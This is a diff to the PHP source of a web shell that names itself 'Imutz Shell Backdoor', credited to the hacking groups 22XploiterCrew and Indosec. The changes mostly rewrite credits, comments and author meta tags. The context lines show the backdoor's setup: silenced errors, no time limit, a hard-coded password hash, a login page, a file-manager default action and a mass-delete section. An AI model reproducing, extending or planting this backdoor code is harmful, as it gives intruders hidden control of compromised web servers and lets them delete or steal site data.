@@ -1,6 +1,9 @@
 <?php
 /*
-[ Tidak Sepenuhnya Menggunakan Akal Dan Pikiran Kami Saat Membuat Shell Bangsad Ini ]
+[ Tak semua kami ngotak sendiri ]
+Special thanks for Holiq@Indosec
+Collabs team 22XploiterCrew ft Indosec Coder Team
+[ InonesiamGOV ]
 */
 session_start();
 error_reporting(0);
@@ -12,7 +15,6 @@ set_time_limit(0);
 @ini_set('output_buffering',0);
 @ini_set('display_errors', 0);
 
-/* Configurasi */
 $password 			= "5a22244060f9458e6364382a8152043f";   // 22XC
 $color 				= "#00ff00";
 $default_action 	= 'FilesMan';
@@ -36,7 +38,8 @@ function login_shell() {
     <meta charset="utf-8">
 		<meta name='viewport' content='widht=device-widht, initial-scale=0.75'>
 		<link rel='icon' type='image/png' href='https://avatars3.githubusercontent.com/u/53482167?s=460&v=4'/>
-		<meta name='author' content='CodeXploit'/>
+		<meta name='author' content='CodeXploit@22XploiterCrew'/>
+		<meta name='author' content='Holiq@Indosec'/>
 		<meta name='copyright' content='22XploiterCrew'/>
 		<meta name='description' content='Imutz Shell Backdoor'>
 		<meta name="theme-color" content="#000">
@@ -258,7 +261,7 @@ echo "
 	<head>
 		<meta name='viewport' content='widht=device-widht, initial-scale=0.75'>
 		<link rel='icon' type='image/png' href='https://avatars3.githubusercontent.com/u/53482167?s=460&v=4'/>
-		<meta name='author' content='CodeXploit'/>
+		<meta name='author' content='CodeXploit+Holiq'/>
 		<meta name='copyright' content='22XploiterCrew'/>
 		<meta name='description' content='Imutz Shell Backdoor'>
                 <meta name='theme-color' content='#000'>
@@ -714,11 +717,6 @@ echo "
 			}
 			exit;
 		}
-		
-		/*
-			* Fungsi_Tambahan
-			*
-		*/
 
 		/*
 			mass delete
